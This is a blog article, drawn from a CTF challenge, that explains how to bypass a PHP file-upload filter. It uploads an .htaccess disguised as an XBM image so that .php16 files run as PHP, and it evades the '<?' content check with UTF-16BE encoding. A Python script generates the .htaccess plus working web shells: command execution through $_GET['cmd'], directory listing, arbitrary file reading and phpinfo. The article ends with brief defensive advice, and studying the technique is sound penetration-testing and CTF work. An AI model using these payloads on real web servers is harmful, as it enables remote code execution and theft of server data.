+++
categories = ["Articles", "PHP", "Web"]
date = "2019-01-25"
title = "Bypass file upload filter with .htaccess"
subtitle = "What a weak protection !"
thumbnail = "/img/cap.svg"
nopaging = "true"
+++

I think you know what I am talking about. The "file upload" vulnerability is familiar for you ? Nice. So you know how it could be difficult to bypass protection to upload a webshell. I will show you a little technique to add to your test when you are trying to exploit file upload :)

This technique is inspired from the challenge **l33t-hoster** of the [Insomni'hack Teaser 2019 CTF](https://ctftime.org/event/686)

So follow the guide !

## Show me your protection

First step is to understand (at least try) the protection. For this explanation, we will work on a nice PHP example. 

```php
 <?php
if (isset($_GET["source"])) 
    die(highlight_file(__FILE__));

session_start();

if (!isset($_SESSION["home"])) {
    $_SESSION["home"] = bin2hex(random_bytes(20));
}
$userdir = "images/{$_SESSION["home"]}/";
if (!file_exists($userdir)) {
    mkdir($userdir);
}

$disallowed_ext = array(
    "php",
    "php3",
    "php4",
    "php5",
    "php7",
    "pht",
    "phtm",
    "phtml",
    "phar",
    "phps",
);

if (isset($_POST["upload"])) {
    if ($_FILES['image']['error'] !== UPLOAD_ERR_OK) {
        die("yuuuge fail");
    }

    $tmp_name = $_FILES["image"]["tmp_name"];
    $name = $_FILES["image"]["name"];
    $parts = explode(".", $name);
    $ext = array_pop($parts);

    if (empty($parts[0])) {
        array_shift($parts);
    }

    if (count($parts) === 0) {
        die("lol filename is empty");
    }

    if (in_array($ext, $disallowed_ext, TRUE)) {
        die("lol nice try, but im not stupid dude...");
    }

    $image = file_get_contents($tmp_name);
    if (mb_strpos($image, "<?") !== FALSE) {
        die("why would you need php in a pic.....");
    }

    if (!exif_imagetype($tmp_name)) {
        die("not an image.");
    }

    $image_size = getimagesize($tmp_name);
    if ($image_size[0] !== 1337 || $image_size[1] !== 1337) {
        die("lol noob, your pic is not l33t enough");
    }

    $name = implode(".", $parts);
    move_uploaded_file($tmp_name, $userdir . $name . "." . $ext);
}

echo "<h3>Your <a href=$userdir>files</a>:</h3><ul>";
foreach(glob($userdir . "*") as $file) {
    echo "<li><a href='$file'>$file</a></li>";
}
echo "</ul>";

?>

<h1>Upload your pics!</h1>
<form method="POST" action="?" enctype="multipart/form-data">
    <input type="file" name="image">
    <input type="submit" name=upload>
</form>
```

And it look like this

![](/img/articles/bypass-filter-upload-1.png "")

To sum up. Filters do :

- **Check the file extension**. If the file finish by `.php` or something like this, it will be refused.
- **Check the filename**. If the filename can't be splited in twice with `.` separator, it will be refused.
- **Check the content**. If the string `<?` are present in the content, the file will be refused.
- **Check the header**. If the file is not an image, refused it.
- **Check the size**. If the file's height and width are not equal to 1337, refused it.

Wow ! That's a secured upload form. But you can easily bypass it ;)


## Choose the good file

So, if we recap, we can't upload file with php extension. So the current goal is to have the possibility to execute php code in other file than `.php`. You can do the trick with `.htaccess`.

But what is `.htaccess` file ?

_".htaccess is a configuration file for use on web servers running the Apache Web Server software. When a .htaccess file is placed in a directory which is in turn 'loaded via the Apache Web Server', then the .htaccess file is detected and executed by the Apache Web Server software."_


Pretty clear. Thanks google ! So it's a configuration file. Now look at this conf :

```bash
AddType application/x-httpd-php .php16      # Say all file with extension .php16 will execute php

php_value zend.multibyte 1                  # Active specific encoding (you will see why after :D)
php_value zend.detect_unicode 1             # Detect if the file have unicode content
php_value display_errors 1                  # Display php errors
```

So if you can upload this `.htaccess` file we will be the king and we will can execute our php code.

So try to upload it and we obtain :

```text
lol filename is empty
```

Damned ! But if we analyse the code, we see it split the string in twice with `.` and check if there is two parts on the obtained array. So if we send a filename like `..htaccess`, the code will split in two parts : `.` and `.htaccess`. Test it !

```text
not an image.
```

S**t ! Yeah our file is not an image, it's a htaccess file.

## Welcome to polyglot file

What is polyglot file ?

_"In computing, a polyglot is a computer program or script written in a valid form of multiple programming languages, which performs the same operations or output independent of the programming language used to compile or interpret it."_


The first trick here is to find a way to bypass image checker. How would it be possible to send our `.htaccess` to pass through `exif_imagetype()` protection. The first think is to read the php doc to understand the function : http://php.net/manual/en/function.exif-imagetype.php

Go to the bottom on the page and you will see all file authorized by the function. The goal is to found a format pretty clear to avoid garbage in our `.htaccess`. I think a XBM (X Bit Map) file will do the trick.

![](/img/articles/bypass-filter-upload-2.png "")


Ok but what is a xbm file ? Look at wikipedia my dear : https://en.wikipedia.org/wiki/X_BitMap


_"In computer graphics, the X Window System used X BitMap (XBM), a plain text binary image format, for storing cursor and icon bitmaps used in the X GUI."_

And there is an example :

```bash
#define test_width 16
#define test_height 7
static char test_bits[] = {
0x13, 0x00, 0x15, 0x00, 0x93, 0xcd, 0x55, 0xa5, 0x93, 0xc5, 0x00, 0x80,
0x00, 0x60 };
```
**OH ! Look at this !**

![](https://media.giphy.com/media/WuGSL4LFUMQU/giphy.gif "")

The format of xbitmap is pretty clear : you set the image size on the first line of the file. And we've got a `#` in front of the line ! So our `.htaccess` will not be disturbed by the xbitmap header. And with this trick **we bypass size and image filter**. Let's try this.

There is our new `..htaccess` file

```bash
#define width 1337                          # Define the width wanted by the code (and say we are a legit xbitmap file lol)
#define height 1337                         # Define the height

AddType application/x-httpd-php .php16      # Say all file with extension .php16 will execute php

php_value zend.multibyte 1                  # Active specific encoding (you will see why after :D)
php_value zend.detect_unicode 1             # Detect if the file have unicode content
php_value display_errors 1                  # Display php errors
```

So upload it ! And oh magic the code accepted our file ! :D
We don't see our `.htaccess` because apache default configuration hide all file starting with a `.`

![](/img/articles/bypass-filter-upload-3.png "")



## Bypass the anti-PHP protection

Nice ! I uploaded my `.htaccess` to run the php contain in my `.php16` files. But how can I upload php to bypass the filter on the code. The answer is simple : encode your payload. 

Explanation. PHP support several form of encoding. Currently, you are writing in utf-8, but php also support utf-16 encoding. There is the same payload but encoded in utf-8 and after in utf-16

In utf-8, a character is encoded on 1 byte.

```
00000000: 3c3f 7068 7020 7379 7374 656d 2824 5f47  <?php system($_G
00000010: 4554 5b27 636d 6427 5d29 3b20 6469 6528  ET['cmd']); die(
00000020: 293b 203f 3e0a                           ); ?>.
```

But in utf-16, the character is encoded on 2 bytes.

```
00000000: 003c 003f 0070 0068 0070 0020 0073 0079  .<.?.p.h.p. .s.y
00000010: 0073 0074 0065 006d 0028 0024 005f 0047  .s.t.e.m.(.$._.G
00000020: 0045 0054 005b 0027 0063 006d 0064 0027  .E.T.[.'.c.m.d.'
00000030: 005d 0029 003b 0020 0064 0069 0065 0028  .].).;. .d.i.e.(
00000040: 0029 003b 0020 003f 003e 0a              .).;. .?.>.
```
I choose here utf-16 Big Endian encoding (to avoid some php bug). So we will have padding before our char : `003c` for the char `<` in utf-16 instead of `3c` in utf-8. With this trick, the filter will not be triggered !

Here is a little python script to automate payload creation. You have to put the xbitmap signature to bypass the others filters.

```python
## Description : create and bypass file upload filter with .htaccess
## Author : Thibaud Robin

# Will prove the file is a legit xbitmap file and the size is 1337x1337
SIZE_HEADER = b"\n\n#define width 1337\n#define height 1337\n\n"

def generate_php_file(filename, script):
	phpfile = open(filename, 'wb') 

	phpfile.write(script.encode('utf-16be'))
	phpfile.write(SIZE_HEADER)

	phpfile.close()

def generate_htacess():
	htaccess = open('..htaccess', 'wb')

	htaccess.write(SIZE_HEADER)
	htaccess.write(b'AddType application/x-httpd-php .php16\n')
	htaccess.write(b'php_value zend.multibyte 1\n')
	htaccess.write(b'php_value zend.detect_unicode 1\n')
	htaccess.write(b'php_value display_errors 1\n')

	htaccess.close()
		
generate_htacess()

generate_php_file("webshell.php16", "<?php system($_GET['cmd']); die(); ?>")
generate_php_file("scandir.php16", "<?php echo implode('\n', scandir($_GET['dir'])); die(); ?>")
generate_php_file("getfile.php16", "<?php echo file_get_contents($_GET['file']); die(); ?>")
generate_php_file("info.php16", "<?php phpinfo(); die(); ?>")
```

Upload them...

![](/img/articles/bypass-filter-upload-4.png "")

And enjoy your webshell :)

![](/img/articles/bypass-filter-upload-5.png "")


## Conclusion

It's really complicated to do a good and secure feature of file upload. There will be always a technique to bypass the security. The best way to secure your platform is to use framework which are already secured (a little...) and to install a WAF (Web Application Firewall) like ModSecurity in Apache in front of your application.

And always never trust user input !!!

See you soon :)

Th1b4ud